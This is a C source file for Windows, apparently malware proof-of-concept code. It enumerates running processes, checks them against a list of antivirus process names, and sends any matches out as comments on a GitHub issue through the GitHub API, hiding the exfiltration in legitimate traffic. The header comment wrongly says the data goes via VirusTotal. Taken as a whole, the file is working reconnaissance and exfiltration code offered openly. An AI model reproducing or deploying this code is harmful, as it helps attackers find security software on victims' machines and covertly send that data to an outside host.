/*
 * hack3.c
 * sending systeminfo via legit URL. VirusTotal API
 * author @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <iphlpapi.h>

// define a struct to store process name and description
typedef struct {
  char process_name[256];
  char description[256];
} Process;

// array of Process structs, and counter
Process* process_list;
int process_count = 0;

#define GITHUB_TOKEN "github_classic_token"
#define REPO_OWNER "cocomelonc"
#define REPO_NAME "ejpt"
#define ISSUE_NUMBER "1"

// send data to GitHub using winhttp
int sendToGitHub(const char* comment) {
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;

  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (hSession == NULL) {
    fprintf(stderr, "WinHttpOpen. error: %d has occurred.\n", GetLastError());
    return 1;
  }

  hConnect = WinHttpConnect(hSession, L"api.github.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect == NULL) {
    fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hSession);
    return 1;
  }

  WCHAR url[256];
  swprintf(url, 256, L"/repos/%s/%s/issues/%s/comments", REPO_OWNER, REPO_NAME, ISSUE_NUMBER);
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", url, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (hRequest == NULL) {
    fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  // construct the request body
  char json_body[1024];
  snprintf(json_body, sizeof(json_body), "{\"body\": \"%s\"}", comment);

  // set the headers
  WCHAR headers[512];
  swprintf(headers, 512, L"Authorization: Bearer %s\r\nUser-Agent: hack-client\r\nContent-Type: application/json\r\n", GITHUB_TOKEN);

  if (!WinHttpSendRequest(hRequest, headers, -1, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0)) {
    fprintf(stderr, "WinHttpSendRequest. error %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  BOOL hResponse = WinHttpReceiveResponse(hRequest, NULL);
  if (!hResponse) {
    fprintf(stderr, "WinHttpReceiveResponse. error %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  DWORD code = 0;
  DWORD codeS = sizeof(code);
  if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &code, &codeS, WINHTTP_NO_HEADER_INDEX)) {
    if (code == 201) {
      printf("comment posted successfully.\n");
    } else {
      printf("failed to post comment. HTTP Status Code: %d\n", code);
    }
  } else {
    DWORD error = GetLastError();
    LPSTR buffer = NULL;
    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL, error, 0, (LPSTR)&buffer, 0, NULL);
    printf("unknown error: %s\n", buffer);
    LocalFree(buffer);
  }

  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hSession);

  return 0;
}

// read process data from a file
void readProcListFromFile(const char* filename) {
  FILE* file = fopen(filename, "r");
  if (file == NULL) {
    printf("Could not open file %s", filename);
    return;
  }

  char line[512];
  while (fgets(line, sizeof(line), file)) {
    // reallocate memory for each new process
    process_list = (Process*)realloc(process_list, (process_count + 1) * sizeof(Process));
    // parse the line, split it into process name and description
    char* token = strtok(line, "|");
    strcpy(process_list[process_count].process_name, token);
    token = strtok(NULL, "|");
    strcpy(process_list[process_count].description, token);
    process_count++;
  }

  fclose(file);
}

// enumerate running processes
void enumProcs() {
  HANDLE hProcessSnap;
  PROCESSENTRY32 pe32;
  char avInfo[4096] = "";

  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hProcessSnap == INVALID_HANDLE_VALUE) {
    printf("CreateToolhelp32Snapshot failed.\n");
    return;
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (!Process32First(hProcessSnap, &pe32)) {
    printf("Process32First failed.\n");
    CloseHandle(hProcessSnap);
    return;
  }

  do {
    for (int i = 0; i < process_count; i++) {
      if (_stricmp(process_list[i].process_name, pe32.szExeFile) == 0) {
        printf("found process: %s - %s \n", process_list[i].process_name, process_list[i].description);
        snprintf(avInfo, sizeof(avInfo),
        "ProcessName: %s, "
        "AVName: %s",
        process_list[i].process_name,
        process_list[i].description);
        // printf("%s\n", avInfo);
        int result = sendToGitHub(avInfo);
        if (result == 0) {
          printf("AV info ok =^..^=\n");
        } else {
          printf("AV info nok <3()~\n");
        }
      }
    }
  } while (Process32Next(hProcessSnap, &pe32));

  int result = sendToGitHub(avInfo);
  
  if (result == 0) {
    printf("AV info ok =^..^=\n");
  } else {
    printf("AV info nok <3()~\n");
  }

  CloseHandle(hProcessSnap);
}

// get systeminfo and send as comment via VT API logic
int main(int argc, char* argv[]) {

  // test posting comment
  const char* comment = "meow-meow";
  sendToGitHub(comment);

  readProcListFromFile("processes.txt");
  enumProcs();
  // cleanup allocated memory
  if (process_list) {
    free(process_list);
  }

  return 0;
}
